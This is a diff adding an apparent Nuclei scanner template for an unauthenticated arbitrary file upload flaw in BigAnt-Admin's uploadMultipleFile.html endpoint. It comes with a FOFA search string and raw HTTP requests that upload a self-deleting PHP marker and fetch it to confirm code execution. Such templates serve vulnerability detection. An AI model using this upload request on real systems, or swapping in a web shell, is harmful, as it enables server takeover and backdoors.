@@ -1,0 +1,57 @@
+id: BigAnt-Admin-uploadMultipleFile_html-File-upload
+
+info:
+  name: 杭州九麒科技 BigAnt-Admin uploadMultipleFile.html 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="BigAnt-Admin"
+    杭州九麒科技 BigAnt-Admin uploadMultipleFile.html 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s/Z4_9w09uU0kbvig0qUk8Ww
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /Addin/Upload/uploadMultipleFile.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1zY65etyNeQDfyjX
+
+        ------WebKitFormBoundary1zY65etyNeQDfyjX
+        Content-Disposition: form-data; name="file"; filename="{{username}}.php"
+
+        <?php print(111*222);unlink(__FILE__);?>
+        ------WebKitFormBoundary1zY65etyNeQDfyjX--
+    extractors:
+       - type: regex 
+         part: body
+         name: time
+         group: 1
+         regex:
+           - '(\b\d{4}-\d{2}-\d{1,2}\b)'
+         internal: true
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+           - '(\/[a-zA-Z0-9-]+\.php)'
+         internal: true
+  - raw:
+      - |
+        GET /data/0/admin/{{time}}{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
+      - type: status
+        status: 
+          - 200
